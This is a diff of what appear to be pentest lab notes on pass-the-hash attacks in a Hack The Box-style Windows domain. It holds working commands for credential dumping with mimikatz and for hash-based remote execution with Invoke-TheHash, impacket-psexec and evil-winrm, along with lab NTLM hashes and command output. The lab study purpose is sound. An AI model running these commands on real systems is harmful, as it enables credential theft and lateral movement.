@@ -5,7 +5,7 @@ Legacy SSO mechanism. We can use NTLM hash for PtH.
 
 https://github.com/gentilkiwi/mimikatz
 
-# PtH with mimikatz
+# PtH with #Mimikatz 
 ```powershell
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 ```
@@ -13,7 +13,6 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 * /rc4 or /NTLM - NTLM hash of the user's password.
 * /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
 * /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
-
 #### Extract hashes from an admin account of other users
 ```powershell
 .\mimikatz.exe
@@ -21,11 +20,10 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 privilege::debug
 sekurlsa::logonpasswords
 ```
-	
 # PtH with Invoke-TheHash
 https://github.com/Kevin-Robertson/Invoke-TheHash
 
-## SMB
+## #SMB
 ```powershell
 PS c:\htb> cd C:\tools\Invoke-TheHash\
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
@@ -46,7 +44,7 @@ PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.ht
 [+] Command executed with process id 520 on DC01
 ```
 
-# PtH with Impacket
+# PtH with #Impacket
 ```bash
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
@@ -92,7 +90,7 @@ SMB         10.129.201.126  445    MS01            [+] Executed command
 SMB         10.129.201.126  445    MS01            MS01\administrator
 ```
 
-# PtH with evil-winrm
+# PtH with #evil-winrm
 ```bash
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
